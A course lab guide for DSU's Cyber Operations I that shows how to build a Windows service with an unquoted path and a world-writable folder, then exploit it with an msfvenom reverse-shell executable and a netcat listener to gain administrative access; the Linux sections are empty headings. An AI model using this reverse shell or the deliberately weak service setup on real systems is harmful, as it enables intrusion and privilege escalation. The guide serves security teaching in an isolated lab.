# Security First Principles: Least Privilege Labs
Created for DSU's Cyber Operations I course

| Box Name | Type |
| -------- | ------- |
| Linux Exercises | Kali 2023.3 |
| Windows Exercises | Windows 10 Pro build 19044 |
* Windows Defender is disabled via Group Policy on the Windows Exercises box.

## Windows PrivEsc (Horizontal/Vertical)
### Configuration
#### Horizontal PrivEsc via Unquoted Service Path
1. Add an administrative user and a standard user user to the box, with different passwords. Use the administrative user for the following steps.
2. Create a "Step 4" folder on the desktop of the administrative user.
3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
     * Ensure the `Level 2 Name` contains a space (ex. `Automated Service`)
     * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
5. Edit the `Level 1 Name` folder properties to grant all users write permission (Properties > Security > Users > Edit > Write).
6. Create a new registry key in `HKLM\SYSTEM\CurrentControlSet\Services`. This key will be the service name.
7. Add the following values to the key:

    | Name | Type | Data |
    | -------- | ------- | ------- |
    | (Default) | REG_SZ | (value not set) |
    | DisplayName | REG_SZ | [Service Name] |
    | ErrorControl | REG_DWORD | 0x00000001 (1) |
    | ImagePath | REG_EXPAND_SZ | [Path to Dummy Service Executable **without quotes**] |
    | ObjectName | REG_SZ | .\\[User Name] |
    | Start | REG_DWORD | 0x00000002 (2) |
    | Type | REG_DWORD | 0x00000010 (16) |

8. Restart the box.
9. Open the Services MMC snap-in. The `[Service Name]` should appear in the list. Ensure the startup type is set to Automatic so it executes when the box starts.

#### Exploitation
#### Horizontal PrivEsc via Unquoted Service Path
1. Log on to the standard user.
2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
      * In the example above, this would be Automated.exe

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
```

2. SCP the generated file from the LInux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the adminsitrative user.

## Linux Horziontal PrivEsc

## Linux Vertical PrivEsc
